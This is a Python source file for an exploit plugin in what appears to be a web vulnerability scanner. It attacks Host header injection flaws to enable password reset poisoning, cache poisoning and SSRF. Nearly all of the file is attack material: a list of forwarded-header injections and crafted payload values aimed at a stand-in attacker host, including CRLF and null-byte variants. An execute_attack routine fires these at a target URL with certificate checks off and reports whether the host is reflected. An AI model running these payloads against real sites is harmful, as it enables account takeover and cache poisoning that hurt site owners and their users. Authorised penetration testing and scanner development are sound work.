"""
Host Header Injection Exploit Plugin

Provides exploit capabilities for Host Header Injection vulnerabilities:
- Password reset poisoning PoC
- Cache poisoning via Host header
- SSRF via Host header
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

_ATTACKER_HOST = 'attacker.example.com'

_INJECTION_HEADERS = [
    {'Host': _ATTACKER_HOST},
    {'X-Forwarded-Host': _ATTACKER_HOST},
    {'X-Host': _ATTACKER_HOST},
    {'X-Forwarded-Server': _ATTACKER_HOST},
    {'X-Original-URL': f'https://{_ATTACKER_HOST}'},
    {'X-HTTP-Host-Override': _ATTACKER_HOST},
    {'X-Forwarded-For': _ATTACKER_HOST},
    {'X-Real-IP': _ATTACKER_HOST},
    {'True-Client-IP': _ATTACKER_HOST},
    {'Forwarded': f'host={_ATTACKER_HOST}'},
    {'X-Original-Host': _ATTACKER_HOST},
    {'X-Rewrite-URL': f'https://{_ATTACKER_HOST}'},
    {'X-Custom-IP-Authorization': _ATTACKER_HOST},
    {'X-ProxyUser-Ip': _ATTACKER_HOST},
    {'Via': f'1.1 {_ATTACKER_HOST}'},
    {'Client-IP': _ATTACKER_HOST},
    {'CF-Connecting-IP': _ATTACKER_HOST},
    {'Fastly-Client-IP': _ATTACKER_HOST},
    {'X-Forwarded-Host': f'{_ATTACKER_HOST}:443'},
    {'Host': f'{_ATTACKER_HOST}:80'},
    {'X-Forwarded-Host': f'@{_ATTACKER_HOST}'},
    {'X-Forwarded-Host': f'{_ATTACKER_HOST}%00'},
]


class HostHeaderPlugin(ExploitPlugin):
    """Host Header Injection exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'host_header'

    @property
    def name(self) -> str:
        return 'Host Header Injection Exploit'

    @property
    def description(self) -> str:
        return 'Host Header Injection exploit: password reset poisoning, cache poisoning, SSRF.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return injected host header values."""
        attacker = (context or {}).get('attacker_host', _ATTACKER_HOST)
        return [
            attacker,
            f'{attacker}:80',
            f'{attacker}:443',
            f'{attacker}:8080',
            f'//{attacker}',
            f'http://{attacker}',
            f'https://{attacker}',
            f'@{attacker}',
            f'{attacker}%00',
            f'{attacker}%0d%0a',
            f'{attacker}:80@trusted.com',
            f'trusted.com.{attacker}',
            f'{attacker}/evil',
            f'{attacker};port=443',
            f'[{attacker}]',
            f'{attacker}:443/reset?token=hijack',
            f'{attacker}%2F',
            f'not{attacker}',
            f'{attacker}:80 {attacker}:443',
            f'1.1 {attacker}',
            f'host={attacker}',
            f'for={attacker};proto=https',
        ]

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Send requests with injected Host/forwarded headers and check for reflection."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'host_header',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        attacker_host = config.get('attacker_host', _ATTACKER_HOST)

        for header_set in _INJECTION_HEADERS:
            # Replace placeholder with configured attacker host
            headers = {k: v.replace(_ATTACKER_HOST, attacker_host) for k, v in header_set.items()}
            try:
                resp = requests.get(target_url, headers=headers, timeout=timeout,
                                    verify=verify_ssl, allow_redirects=False)
                body = resp.text
                location = resp.headers.get('Location', '')

                if attacker_host in body or attacker_host in location:
                    return {
                        'success': True,
                        'vulnerability_type': 'host_header',
                        'injected_headers': headers,
                        'evidence': (
                            f'Attacker host "{attacker_host}" reflected in response '
                            f'(body={attacker_host in body}, location={attacker_host in location})'
                        ),
                        'message': 'Host header injection confirmed â€” attacker host reflected',
                    }
            except Exception as e:
                logger.debug(f"Host header test error (headers={headers}): {e}")

        return {
            'success': False,
            'error': 'No host header injection confirmed',
            'vulnerability_type': 'host_header',
        }
